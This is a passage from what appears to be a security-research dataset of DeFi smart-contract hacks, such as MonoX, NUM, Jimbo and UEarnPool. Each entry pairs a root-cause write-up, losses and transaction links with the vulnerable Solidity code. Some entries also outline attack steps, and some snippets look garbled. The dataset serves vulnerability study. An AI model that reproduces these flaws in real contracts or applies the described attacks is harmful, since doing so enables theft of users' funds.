        "vulnerable_code_snippet": "// actually removes liquidity\nfunction removeLiquidity(address _token, uint256 liquidity, address to, \n    uint256 minVcashOut, \n    uint256 minTokenOut) external returns(uint256 vcashOut, uint256 tokenOut) {\n    (vcashOut, tokenOut) = _removeLiquidityHelper(_token, liquidity, to, minVcashOut, minTokenOut, false);\n}\n...\n// swap from tokenIn to tokenOut with fixed tokenIn amount.\nfunction swapIn(address tokenIn, address tokenOut, address from, address to,\n    uint256 amountIn) internal lockToken(tokenIn) returns(uint256 amountOut) {\n    ...\n    // trading in\n    if (tokenIn == address(vCash)) {\n        vCash.burn(monoXPoolLocal, amountIn);\n        // all fees go to the other side\n        oneSideFeesInVcash = oneSideFeesInVcash.mul(2);\n    } else {\n        _updateTokenInfo(tokenIn, tokenInPrice, 0, tradeVcashValue.add(oneSideFeesInVcash), 0);\n    }\n\n    // trading out\n    if (tokenOut == address(vCash)) {\n        vCash.mint(to, amountOut);\n    } else {\n        if (to != monoXPoolLocal) {\n            IMonoXPool(monoXPoolLocal).safeTransferERC20Token(tokenOut, to, amountOut);\n        }\n        _updateTokenInfo(tokenOut, tokenOutPrice, tradeVcashValue.add(oneSideFeesInVcash), 0, \n            to == monoXPoolLocal ? amountOut : 0);\n    }\n    // actually removes liquidity\n    function _removeLiquidityHelper(address _token, uint256 liquidity, address to, \n        uint256 minVcashOut, \n        uint256 minTokenOut,\n        bool isETH) lockToken(_token) internal returns(uint256 vcashOut, uint256 tokenOut) {\n        require(tokenPoolStatus[_token] == 1, \"MonoX:NO_TOKEN\");\n        PoolInfo memory pool = pools[_token];\n        uint256 poolValue;\n        uint256 liquidityIn;\n        (poolValue, liquidityIn, vcashOut, tokenOut) = _removeLiquidity(_token, liquidity, to); // vulnerable point\n        _mintFee(pool.pid, pool.lastPoolValue, poolValue);\n        require(vcashOut >= minVcashOut, \"MonoX:INSUFF_vCash\");\n        require(tokenOut >= minTokenOut, \"MonoX:INSUFF_TOKEN\");\n\n        if (vcashOut > 0) {\n            vCash.mint(to, vcashOut);\n        }\n        if (!isETH) {\n            monoXPool.safeTransferERC20Token(_token, to, tokenOut);\n        } else {\n            monoXPool.withdrawWETH(tokenOut);\n            monoXPool.safeTransferETH(to, tokenOut);\n        }\n\n        monoXPool.burn(to, pool.pid, liquidityIn);\n\n        _syncPoolInfo(_token, 0, vcashOut);\n\n        emit RemoveLiquidity(to, \n            pool.pid,\n            _token,\n            liquidityIn, \n            vcashOut, tokenOut, pool.price);\n    }"
    },
    {
        "type": "CrossChain, ERC20, Token Incompatible",
        "date": "20221123",
        "title": "NUM",
        "root_cause": "NUM token incompatible with the Multichain Router. The attacker took advantage of a vulnerability in the Multichain bridge Router contract by exploiting the lack of compatibility between the NUM token and the Router. **The NUM token did not implement the required permit()** function but had a fallback() function that could be exploited. To carry out the attack, the attacker created a fake token called anyToken, using NUM as the underlying token. They then deceived the Multichain Router by calling the anySwapOutUnderlyingWithPermit() function and providing the fake anyToken and a forged signature as parameters. Since the fallback function was present in NUM, the invocation of NUM.permit() succeeded. Subsequently, the attacker exchanged all the NUM tokens for approximately 13 Ether, making a profit from the attack",
        "attack_tx": "https://explorer.phalcon.xyz/tx/eth/0x8a8145ab28b5d2a2e61d74c02c12350731f479b3175893de2014124f998bff32",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/NUM_exp.sol",
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1595346020237352960",
            "https://medium.com/numbers-protocol/investigation-report-of-multi-chain-bridge-incident-d4773cb3e87b",
            "https://neptunemutual.com/blog/taking-a-closer-look-at-the-numbers-protocol-hack/"
        ],
        "lost": "$13k",
        "vulnerable_code_snippet": "function anySwapOutUnderlyingWithPermit(\n    address from,\n    address token,\n    address to,\n    uint amount,\n    uint deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s,\n    uint toChainID\n) external {\n    address _underlying = AnyswapV1ERC20(token).underlying();\n    \n    IERC20(_underlying).permit(from, address(this), amount, deadline, v, r, s);\n    TransferHelper.safeTransferFrom(_underlying, from, token, amount);\n    AnyswapV1ERC20(token).depositVault(amount, from);\n    _anySwapOut(from, token, to, amount, toChainID);\n}"
    },
    {
        "type": "Insufficient validation",
        "date": "20240110",
        "title": "LQDX",
        "root_cause": "The problem lies in the `deposit` function where there is no check that the `account` should be `msg.sender`, thus `account`'s approval on the `zap` can be spent to buy tokens and add liquidity.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/LQDX_alert_exp.sol",
        "attack_tx": null,
        "analysis": null,
        "vulnerable_code_snippet": "function deposit(\n    address account,\n    address token,\n    address tokenM,\n    swapPath calldata path,\n    address token0,\n    address token1,\n    uint256[3] calldata amount,\n    uint256 basketId\n) public payable returns (uint256) {\n    address pair = ILiquidXv2Factory(factory).getPair(token0, token1);\n    require(pair != address(0), \"LiquidXv2Zap: no pair\");\n\n    // retAddLp 0, 1, 2\n    // inAmount\n    // token0Amount, token1Amount\n    uint256[6] memory lvar;\n    lvar[3] = msg.value;\n    address inToken = token;\n    if (token != address(0)) {\n        lvar[3] = IERC20(token).balanceOf(address(this));\n        IERC20(token).safeTransferFrom(account, address(this), amount[0]);\n        lvar[3] = IERC20(token).balanceOf(address(this)) - lvar[3];\n    } else {\n        inToken = wrappedETH;\n        IWETH(wrappedETH).deposit{value: lvar[3]}();\n    }\n\n    if (path.path.length > 0) {\n        _approveTokenIfNeeded(inToken, swapPlus, lvar[3]);\n        (, lvar[3]) = ISwapPlusv1(swapPlus).swap(inToken, lvar[3], tokenM, address(this), path.path);\n        inToken = tokenM;\n    }\n\n    (lvar[4], lvar[5]) = _depositSwap(token0, token1, inToken, lvar[3]);\n    (lvar[0], lvar[1], lvar[2]) = ILiquidXv2Router01(router).addLiquidity(token0, token1, lvar[4], lvar[5], amount[1], amount[2], address(this), block.timestamp);\n    _refundReserveToken(account, token0, token1, lvar[4] - lvar[0], lvar[5] - lvar[1]);\n\n    if (basketId == 0) {\n        IERC20(pair).safeTransfer(account, lvar[2]);\n    } else {\n        _addBalance(account, pair, basketId, lvar[2]);\n    }\n\n    if (rewarder != address(0) && IRewarderv2(rewarder).getReward(account, pair) > 0) {\n        IRewarderv2(rewarder).claim(account, pair);\n    }\n\n    emit Deposit(account, token0, token1, basketId, lvar[2]);\n    return lvar[2];\n}"
    },
    {
        "type": "Access Control",
        "date": "20240510",
        "title": "GFOX",
        "root_cause": "Attacker can set merkleroot.",
        "attack_tx": "https://etherscan.io/tx/0x12fe79f1de8aed0ba947cec4dce5d33368d649903cb45a5d3e915cc459e751fc",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/GFOX_exp.sol",
        "analysis": "https://x.com/CertiKAlert/status/1788751142144401886",
        "vulnerable_code": "https://etherscan.io/address/0x47c4b3144de2c87a458d510c0c0911d1903d1686",
        "lost": "330K USD",
        "vulnerable_code_snippet": "// set the merkle root\nbytes32 root = _merkleRoot(address(this), amount);\nvictim.setMerkleRoot(root);\n// claim the GFOX\nvictim.claim(address(this), amount, new bytes32 );\n...\nv4 = stor_1_0_19.setMerkleRoot(keccak256(address(this), v3)).gas(msg.gas);"
    },
    {
        "type": "Insufficient validation",
        "date": "20240201",
        "lost": "88K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/AffineDeFi_exp.sol",
        "title": "AffineDeFi",
        "root_cause": "The contract's flashloan callback for Balancer only verified the caller but failed to validate user data from untrusted sources. This allowed attackers to exploit the function and steal collateral tokens by providing malicious inputs.",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/eth/0x03543ef96c26d6c79ff6c24219c686ae6d0eb5453b322e54d3b6a5ce456385e5",
        "analysis": "https://medium.com/neptune-mutual/how-was-affine-protocol-exploited-f4933c4035b4",
        "vulnerable_code_snippet": "function _payDebtAndTransferCollateral(LidoLevV3 newStrategy) internal {\n  // Pay debt in aave.\n  uint256 debt = debtToken.balanceOf(address(this));\n  AAVE.repay(address(WETH), debt, 2, address(this));\n\n  // Transfer collateral (aTokens) to new Strategy.\n  aToken.safeTransfer(address(newStrategy), aToken.balanceOf(address(this)));\n\n  // Make the new strategy borrow exactly the same amount as this strategy originally had in debt.\n  newStrategy.createAaveDebt(debt);\n}"
    },
    {
        "type": "Price Manipulation",
        "date": "20230529",
        "lost": "$8M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Jimbo_exp.sol",
        "title": "Jimbo",
        "root_cause": "This attack exploited a vulnerability in the JimboController contract, which allows anyone to use the shift() function to make the contract execute liquidity removal and addition operations. The shift() function takes the funds of the contract to add liquidity, resulting in all the WETH of the JimboController contract being added as liquidity.\n\nSince the prices of WETH and JIMBO in the pool are not balanced, when adding liquidity, the required token quantity will be calculated based on the current price, allowing the attacker to obtain more WETH.",
        "vulnerable_code": "https://arbiscan.io/address/0x271944d9D8CA831F7c0dBCb20C4ee482376d6DE7#code#F1#L308",
        "attack_tx": [
            "https://arbiscan.io/tx/0xf9baf8cee8973cf9700ae1b1f41c625d7a2abdbcbc222582d24a8f2f790d0b5a",
            "https://arbiscan.io/tx/0xfda5464e97043a2d0093cbed6d0a64f6a86049f5e9608c014396a7390188670e",
            "https://arbiscan.io/tx/0x3c6e053faecd331883641c1d23c9d9d37d065e4f9c4086e94a3c34bf8702618a",
            "https://arbiscan.io/tx/0x44a0f5650a038ab522087c02f734b80e6c748afb207995e757ed67ca037a5eda"
        ],
        "analysis": [
            "https://twitter.com/cryptofishx/status/1662888991446941697",
            "https://twitter.com/yicunhui2/status/1663793958781353985"
        ],
        "vulnerable_code_snippet": "function shift() public returns (bool) { // vulnerable point\n        if (canShift()) {\n            // Let the token know the protocol is rebalancing\n            jimbo.setIsRebalancing(true);\n\n            // Get the active bin\n            uint24 activeBin = pair.getActiveId();\n\n            // Remove all non-floor bin liquidity (max bin -> anchor bin)\n            _removeNonFloorLiquidity();\n\n            // Remove all floor bin liquidity\n            _removeFloorLiquidity();\n\n            // Count the total JIMBO and ETH in the contract after liquidity removal\n            uint256 totalJimboInPool = jimbo.balanceOf(address(this));\n            uint256 totalEthInContract = weth.balanceOf(address(this));\n\n            // Floor is based on total eth / circulating supply\n            uint256 totalCirculatingJimbo = jimbo.totalSupply() -\n                jimbo.balanceOf(address(0)) -\n                totalJimboInPool;\n\n            // Calculate the new target floor bin\n            uint24 newFloorBin = _calculateNewFloorBin(\n                totalEthInContract,\n                totalCirculatingJimbo\n            );\n\n            // Calculate new anchor bin id\n            // Make sure you use the new floor bin and not the stale one\n            uint24 newAnchorBin = activeBin - newFloorBin > NUM_ANCHOR_BINS\n                ? activeBin - NUM_ANCHOR_BINS\n                : activeBin - 1;\n\n            // Set internal bin state\n            _setBinState({\n                floorBin_: newFloorBin,\n                anchorBin_: newAnchorBin, // this is not always true\n                triggerBin_: activeBin + NUM_ANCHOR_BINS,\n                maxBin_: activeBin + NUM_LIQ_BINS - 1 // decrement because we are adding inclusive of active bin\n            });\n\n            // Deploy all the JIMBO liquidity first\n            _deployJimboLiquidity();  // vulnerable point\n\n            // Deploy floor bin liquidity with 90% of all ETH in the contract\n            _deployFloorLiquidity((weth.balanceOf(address(this)) * 90) / 100); // vulnerable point\n\n            // Use entire remaining weth balance in the contract to deploy anchors\n            _deployAnchorLiquidity(weth.balanceOf(address(this))); // vulnerable point\n\n            // Let the token know we are done rebalancing to apply taxes\n            jimbo.setIsRebalancing(false);\n            return true;\n        } else return false;\n    }"
    },
    {
        "type": "Rug-Pull(Protocol Side)",
        "date": "20240306",
        "lost": "150K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/TGBS_exp.sol",
        "title": "TGBS",
        "root_cause": "Vulnerable `transfer()` function. In `transfer()` function, 0.3% of TGBS tokens of Cake-LP is burned, when `_burnBlock` is less than block number. Hacker called `trasnfer` function many times, manipulated TGBS:WBNB ratio, could drain pancake pair.",
        "attack_tx": "https://bscscan.com/address/0x1a8eb8eca01819b695637c55c1707f9497b51cd9",
        "analysis": [
            "https://twitter.com/0xNickLFranklin/status/1765290290083144095",
            "https://twitter.com/Phalcon_xyz/status/1765285257949974747"
        ],
        "vulnerable_code_snippet": "function transfer(\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address owner = msg.sender;\n        _transfer(owner, to, amount);\n        return true;\n    }"
    },
    {
        "type": "Arbitrary call, Dex/AMM",
        "date": "20221225",
        "lost": "$1.5M",
        "title": "Rubic",
        "root_cause": "Arbitrary External Call. The attacker abused that USDC had been added as a router (by the admin), leading to an arbitrary function call with USDC contract. Then the attacker invoked transferFrom to steal the victim's USDC.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Rubic_exp.sol",
        "attack_tx": "https://explorer.phalcon.xyz/tx/eth/0x9a97d85642f956ad7a6b852cf7bed6f9669e2c2815f3279855acf7f1328e7d46",
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1606993118901198849",
            "https://twitter.com/peckshield/status/1606937055761952770"
        ],
        "vulnerable_code_snippet": "function routerCallNative(BaseCrossChainParams calldata _params, bytes calldata _data)\n        external\n        payable\n        nonReentrant\n        whenNotPaused\n        eventEmitter(_params)\n    {\n        if (!availableRouters.contains(_params.router)) {\n            revert RouterNotAvailable();\n        }\n\n        IntegratorFeeInfo memory _info = integratorToFeeInfo[_params.integrator];\n\n        uint256 _amountIn = accrueTokenFees(\n            _params.integrator,\n            _info,\n            accrueFixedCryptoFee(_params.integrator, _info),\n            0,\n            address(0)\n        );\n\n        AddressUpgradeable.functionCallWithValue(_params.router, _data, _amountIn);\n    }"
    },
    {
        "type": "Donate, Math, Under/Overflow",
        "date": "20230427",
        "title": "Silo finance",
        "root_cause": "dump utilization ratio by borrowing donated token",
        "attack_tx": "https://github.com/silo-finance/silo-core-v1/blob/master/contracts/InterestRateModel.sol#L134",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/silo_finance.t.sol",
        "analysis": "https://medium.com/immunefi/silo-finance-logic-error-bugfix-review-35de29bd934a",
        "fix": "bound utilizationRate to be < 100",
        "vulnerable_code_snippet": "function calculateCurrentInterestRate(\n        Config memory _c,\n        uint256 _totalDeposits,\n        uint256 _totalBorrowAmount,\n        uint256 _interestRateTimestamp,\n        uint256 _blockTimestamp\n    ) public pure override returns (uint256 rcur) {\n        if (_interestRateTimestamp > _blockTimestamp) revert InvalidTimestamps();\n\n        // struct for local vars to avoid \"Stack too deep\"\n        LocalVarsRCur memory _l = LocalVarsRCur(0,0,0,0,0,0,false);\n\n        (,,,_l.overflow) = calculateCompoundInterestRateWithOverflowDetection(\n            _c,\n            _totalDeposits,\n            _totalBorrowAmount,\n            _interestRateTimestamp,\n            _blockTimestamp\n        );\n\n        if (_l.overflow) {\n            return 0;\n        }\n\n        // There can't be an underflow in the subtraction because of the previous check\n        unchecked {\n            // T := t1 - t0 # length of time period in seconds\n            _l.T = (_blockTimestamp - _interestRateTimestamp).toInt256();\n        }\n\n        _l.u = EasyMath.calculateUtilization(DP, _totalDeposits, _totalBorrowAmount).toInt256();\n        _l.DP = int256(DP);\n\n        if (_l.u > _c.ucrit) {\n            // rp := kcrit *(1 + Tcrit + beta *T)*( u0 - ucrit )\n            _l.rp = _c.kcrit * (_l.DP + _c.Tcrit + _c.beta * _l.T) / _l.DP * (_l.u - _c.ucrit) / _l.DP;\n        } else {\n            // rp := min (0, klow * (u0 - ulow ))\n            _l.rp = _min(0, _c.klow * (_l.u - _c.ulow) / _l.DP);\n        }\n\n        // rlin := klin * u0 # lower bound between t0 and t1\n        _l.rlin = _c.klin * _l.u / _l.DP;\n        // ri := max(ri , rlin )\n        _l.ri = _max(_c.ri, _l.rlin);\n        // ri := max(ri + ki * (u0 - uopt ) * T, rlin )\n        _l.ri = _max(_l.ri + _c.ki * (_l.u - _c.uopt) * _l.T / _l.DP, _l.rlin);\n        // rcur := max (ri + rp , rlin ) # current per second interest rate\n        rcur = (_max(_l.ri + _l.rp, _l.rlin)).toUint256();\n        rcur *= 365 days;\n    }"
    },
    {
        "type": "Insufficient validation",
        "date": "20240712",
        "title": "Dough Finance",
        "lost": "$1.8M",
        "root_cause": "ConnectorDeleverageParaswap contract did not validate flash loan callback data which led to WETH transfer.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/DoughFina_exp.sol",
        "vulnerable_code": "https://etherscan.io/address/0x9f54e8eAa9658316Bb8006E03FFF1cb191AafBE6#code#F1#L331",
        "attack_tx": "https://app.blocksec.com/explorer/tx/eth/0x92cdcc732eebf47200ea56123716e337f6ef7d5ad714a2295794fdc6031ebb2e",
        "analysis": "https://blog.solidityscan.com/doughfina-hack-analysis-685ed56adb19",
        "vulnerable_code_snippet": "function deloopAllCollaterals(bytes[] memory multiTokenSwapData) private {\n        FlashloanVars memory flashloanVars;\n\n        for (uint i = 0; i < multiTokenSwapData.length;) {\n            // Deloop\n            (flashloanVars.srcToken, flashloanVars.destToken, flashloanVars.srcAmount, flashloanVars.destAmount, flashloanVars.paraSwapContract, flashloanVars.tokenTransferProxy, flashloanVars.paraswapCallData) = _getParaswapData(multiTokenSwapData[i]);\n\n            // using ParaSwap\n            IERC20(flashloanVars.srcToken).safeIncreaseAllowance(flashloanVars.tokenTransferProxy, flashloanVars.srcAmount);\n            (flashloanVars.sent, ) = flashloanVars.paraSwapContract.call(flashloanVars.paraswapCallData); // <-- vulnerable point\n            if (!flashloanVars.sent) revert CustomError(\"ParaSwap deloop failed\");\n\n            unchecked { i++; }\n        }\n    }"
    },
    {
        "type": "Unchecked User Input",
        "date": "20230514",
        "title": "SellToken03",
        "root_cause": "StakingRewards contract's Claim() function did not properly validate the input parameters, allowing the attacker to pass a fake token to obtain more rewards.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0xfe80df5d689137810df01e83b4bb51409f13c865e37b23059ecc6b3d32347136",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/SELLC02_exp.sol",
        "analysis": "https://twitter.com/BlockSecTeam/status/1657715018908180480",
        "vulnerable_code_snippet": "function claim(address token, address token1) public { // vulnerable point: no token validation\n\n        require(listToken[token]);\n\n        require(users[token][msg.sender].mnu > 0);\n\n        require(block.timestamp > stakedOfTime[token][msg.sender]);\n\n        uint minit = block.timestamp - stakedOfTime[token][msg.sender];\n\n        uint coin;\n\n        for (uint i = 0; i < users[token][msg.sender].mnu; i++) {\n            if (stakedOfTimeSum[token][msg.sender][i + 1] > minit && stakedOf[token][msg.sender][i + 1] > 0) {\n                uint banOf = stakedOf[token][msg.sender][i + 1] / 100;\n                uint send = getTokenPrice(token1, token, banOf) / RATE_DAY;\n                coin += minit * send;\n                stakedOfTimeSum[token][msg.sender][i + 1] -= minit;\n            }\n        }\n\n        bool isok = IERC20(token).transfer(msg.sender, coin * 50 / 100);\n\n        require(isok);\n\n        stakedOfTime[token][msg.sender] = block.timestamp;\n\n        updateU(token, msg.sender, coin * 50 / 100);\n    }"
    },
    {
        "type": "Access Control",
        "date": "20230412",
        "lost": "$820k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/MetaPoint_exp.sol",
        "title": "MetaPoint",
        "root_cause": "Public `approve()`. This contract has a function called approve that grants the caller of the function access to the $META tokens without any restriction.",
        "analysis": [
            "https://twitter.com/PeckShieldAlert/status/1645980197987192833",
            "https://twitter.com/Phalcon_xyz/status/1645963327502204929"
        ],
        "attack_tx": [
            "invest\n[https://bscscan.com/tx/0xdb01fa33bf5b79a3976ed149913ba0a18ddd444a072a2f34a0042bf32e4e7995](https://bscscan.com/tx/0xdb01fa33bf5b79a3976ed149913ba0a18ddd444a072a2f34a0042bf32e4e7995)",
            "withdraw\n[https://bscscan.com/tx/0x41853747231dcf01017cf419e6e4aa86757e59479964bafdce0921d3e616cc67](https://bscscan.com/tx/0x41853747231dcf01017cf419e6e4aa86757e59479964bafdce0921d3e616cc67)"
        ],
        "vulnerable_code_snippet": "function approve() public payable {\n    v0, /* bool */ v1 = address(0x3b5e381130673f794a5cf67fbba48688386bea86).approve(msg.sender, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff).gas(msg.gas);\n    require(bool(v0), 0, RETURNDATASIZE()); // checks call status, propagates error data on error\n    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);\n    require(v1 == bool(v1));\n}"
    },
    {
        "type": "Bridge, KeyCompromised",
        "date": "20220627",
        "title": "Harmony's Horizon",
        "root_cause": "Private key compromised. Attacker control 2 of 5 wallet can sign the transaction",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220624-harmonys-horizon-bridge---private-key-compromised",
        "analysis": "Attacker control 2 of 5 wallet can sign the transaction.",
        "lost": "$100M"

    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20230611",
        "title": "SellToken04",
        "root_cause": "The price in the USDT-SELLC pool was manipulated, and the sendMiner function relied on the price from that pool.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/SELLC03_exp.sol",
        "attack_tx": "https://bscscan.com/tx/0xe968e648b2353cea06fc3da39714fb964b9354a1ee05750a3c5cc118da23444b",
        "lost": "$109k",
        "vulnerable_code_snippet": "function sendMiner(address token public) { \n    uint memory vid = MyMiner[_msgSender()][token]; \n    address token = sellAddress[vid[0]].pair; \n    uint256 token1 = sellAddress[vid[0]].token1; \n    \n    require(value[vid[0]] > 0 && block.timestamp > sellAddress[token][vid[1]].time + DAYTIME); \n    require(rniner[vid[0]][token]); \n    require(block.timestamp > sellAddress[token][vid[1]].time + DAYTIME && sellAddress[token][vid[1]].ds < 366); \n    uint _day = (block.timestamp - sellAddress[token][vid[1]].time) / DAYTIME; \n    require(_day >= 1 && _day < 366); \n    \n    uint agk = getBnb(token, token1, sellAddress[token][vid[1]].daybnb) * _day; \n    if (IERC20(token).balanceOf(_msgSender()) >= agk) { \n        IERC20(token).transfer(_msgSender(), agk); \n    } \n    sellAddress[token][vid[1]].ds += agk; \n    sellAddress[token][vid[1]].time += DAYTIME * _day; \n} ... function getBnb(address _tokens, address bnbOrUsdt, uint bnb) public view returns (uint) { \n    if (_tokens == address(0)) return 0; \n    address isBnb; \n    if (bnbOrUsdt == _WBNB) { \n        isBnb = WBNB; \n        address; \n        routePath; \n        routePath[0] = WBNB; \n        routePath[1] = isBnb; \n        routePath[2] = _tokens; \n        return IRouter(_router).getAmountsOut(bnb, routePath)[2]; \n    } \n}"
    },
    {
        "type": "Economic, Flashloans, Yield",
        "date": "20201026",
        "Lost": "$33.8 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20201026-harvest-finance---flashloan-attack",
        "Title": "Harvest Finance",
        "root_cause": "Economic issue",
        "vulnerable_code_snippet": "function _deposit(uint256 amount, address sender, address beneficiary) internal {\n    require(amount > 0, \"Cannot deposit 0\");\n    require(beneficiary != address(0), \"holder must be defined\");\n\n    if (address(strategy()) != address(0)) {\n      require(IStrategy(strategy()).depositArbCheck(), \"Too much arb\");\n    }\n\n    uint256 toMint = totalSupply() == 0\n        ? amount\n        : amount.mul(totalSupply()).div(underlyingBalanceWithInvestment());\n    _mint(beneficiary, toMint);\n\n    IERC20(underlying()).safeTransferFrom(sender, address(this), amount);\n\n    // update the contribution amount for the beneficiary\n    emit Deposit(beneficiary, amount);\n}\n\nfunction underlyingBalanceWithInvestment() view public returns (uint256) {\n    if (address(strategy()) == address(0)) {\n      // initial state, when not set\n      return underlyingBalanceInVault();\n    }\n    return underlyingBalanceInVault().add(IStrategy(strategy()).investedUnderlyingBalance());\n}"
    },
    {
        "type": "Under/Overflow",
        "date": "20230315",
        "title": "Poolz",
        "lost": "$390K",
        "root_cause": "The attacker called the vulnerable function `CreateMassPools` and triggered an integer overflow vulnerability in the parameter `_StartAmount`.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/poolz_exp.sol",
        "attack_tx": "All TX within this contract : https://bscscan.com/address/0x058bae36467a9fc5e1045dbdffc2fd65b91c2203",
        "analysis": "https://twitter.com/BeosinAlert/status/1635878098452492288",
        "vulnerable_code_snippet": "function CreateMassPools(\n        address _Token,\n        uint64[] calldata _FinishTime,\n        uint256[] calldata _StartAmount,\n        address[] calldata _Owner\n    ) external isGreaterThanZero(_Owner.length) isBelowLimit(_Owner.length) returns(uint256, uint256) {\n        require(_Owner.length == _FinishTime.length, \"Date Array Invalid\");\n        require(_Owner.length == _StartAmount.length, \"Amount Array Invalid\");\n        TransferInToken(_Token, msg.sender, getArraySum(_StartAmount)); // vulnerable point\n        uint256 firstPoolId = Index;\n        for(uint i = 0; i < _Owner.length; i++) {\n            CreatePool(_Token, _FinishTime[i], _StartAmount[i], _Owner[i]);\n        }\n        uint256 lastPoolId = SafeMath.sub(Index, 1);\n        return (firstPoolId, lastPoolId);\n    }"
    },
    {
        "type": "Dex/AMM, Flashloans, Reward, lending",
        "date": "20220421",
        "Lost": "$1 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220421-zeed-finance---reward-distribution-flaw",
        "Title": "Zeed Finance",
        "root_cause": "incorrect reward calculation. Initially, 5% fee in a selling order were divided into three parts for rewarding liquidity providers. However, based on the token contract loopholes, that part of tokens hadn't been divided by the system so the LP reward was two times greater than the previous one, leading to extra token distribution.",
        "vulnerable_code_snippet": "function _takeReward(\n        address sender,\n        uint256 rewardFee\n    ) private {\n        if (rewardFee == 0) return;\n        uint256 zeedReward = rewardFee.div(2);\n        uint256 hoReward = rewardFee.div(2).div(2);\n        uint256 usdtReward = rewardFee.sub(zeedReward).sub(hoReward);\n\n        _balances[swapPair] = _balances[swapPair].add(rewardFee); // vulnerable point\n        emit Transfer(sender, swapPair, usdtReward);\n\n        _balances[swapPairZeed] = _balances[swapPairZeed].add(rewardFee); // vulnerable point\n        emit Transfer(sender, swapPairZeed, zeedReward);\n\n        _balances[swapPairHo] = _balances[swapPairHo].add(rewardFee); // vulnerable point\n        emit Transfer(sender, swapPairHo, hoReward);\n    }"
    },
    {
        "type": "Bridge, CrossChain, Incorrect logic",
        "date": "20210710",
        "title": "Chainswap",
        "root_cause": "incorrect logic. A bug in the token cross-chain quota code is found. The on-chain swap bridge quota is automatically increased by the signature node, which is intended to be more decentralized without manual control. However, due to a logical flaw in code, this led to an exploit by allowing invalid addresses which weren't whitelisted to automatically increase the amount.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210710-chainswap---bridge-logic-flaw",
        "analysis": "[https://medium.com/wilder-world/important-update-chainswap-hack-cf2153480887]\n[https://rekt.news/chainswap-rekt/]",
        "lost": "$8 M",
        "fixed": "fixed",
        "vulnerable_code_snippet": "function receive(\n    address from,\n    uint256 nonce,\n    bytes memory signatures\n) external payable {\n    // ... other code\n    require(updateAutoQuota(from, signatures), \"Invalid signatures\"); // vulnerable point\n    // ... other code\n}\n\nmodifier updateAutoQuota(address signatory) virtual {\n    uint quota = _authQuotas[signatory];\n    if (_authQuotas[signatory] != quota) {\n        _authQuotas[signatory] = quota;\n        lastTimeUpdatedQuotaOf[signatory] = now;\n    }\n    _;\n}"
    },
    {
        "type": "Business Logic Flaw, Flashloans",
        "date": "20221117",
        "lost": "$24k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/UEarnPool_exp.sol",
        "title": "UEarnPool",
        "root_cause": "The design flaw in the reward distribution which allows the final reward exceed the invested amount.",
        "vulnerable_code": "https://bscscan.com/address/0x02d841b976298dcd37ed6cc59f75d9dd39a3690c#code",
        "attack_tx": [
            "https://bscscan.com/tx/0x824de0989f2ce3230866cb61d588153e5312151aebb1e905ad775864885cd418",
            "https://bscscan.com/tx/0xb83f9165952697f27b1c7f932bcece5dfa6f0d2f9f3c3be2bb325815bfd834ec"
        ],
        "analysis": [
            "Preparation: The attacker deployed 20 attack contracts and bound each of them sequentially",
            "The attacker flashloaned 2.4M BUSD and sent to the last contract(0x21c473f) that was created in the previous step.",
            "The account stake all USDT to the UEarnpool. As a result, inviters will receive some BUSD tokens as reward.",
            "Then the account invoked `claimTeamReward`.",
            "The rest account was repeated 16 times and did stake with 20,000 BUSD and invoked `claimTeamReward` to claim the team reward, which is 162K BUSD. The rewards and the rest of the amount will be sent back to the attacker.",
            "repay the flashloan and finish the attack."
        ],
        "additional_info": "https://twitter.com/CertiKAlert/status/1593094922160128000",
        "vulnerable_code_snippet": "// 1. Reward Calculation in the stake function\nfunction stake(uint256 pid, uint256 amount) external {\n    // ... (other code)\n    uint256 reward = amount * pool.rewardRate / _feeDivFactor; // Risk: High reward rates could lead to excessive rewards\n    uint256 feeAmount = amount * _feeRate / _feeDivFactor;\n\n    _userRecords[account].push(\n        Record(pid, amount, feeAmount, reward, block.timestamp, block.timestamp + pool.duration, 0)\n    );\n    // ... (other code)\n}\n\n// 2. Total transfer amount in unStake function\nfunction unStake(uint256 index) external {\n    // ... (other code)\n    IERC20(_tokenAddress).transfer(account, amount + record.reward - record.feeAmount); // Risk: total transfer could exceed initial stake\n    // ... (other code)\n}\n\n// 3. Invite Reward Calculation in _addInviteReward function\nfunction _addInviteReward(address account, uint256 amount) private {\n    for (uint256 i; i < inviteLength;) {\n        invitor = _invitor[account];\n        if (address(0) == invitor) {\n            break;\n        }\n        // ... (other code)\n        uint256 inviteReward = amount * _inviteFee[i] / _feeDivFactor; // Risk: Accumulation could exceed initial investment\n        if (inviteReward > 0) {\n            invitorInfo.inviteReward += inviteReward;\n            token.transfer(invitor, inviteReward);\n        }\n        // ... (other code)\n    }\n}\n\n// 4. 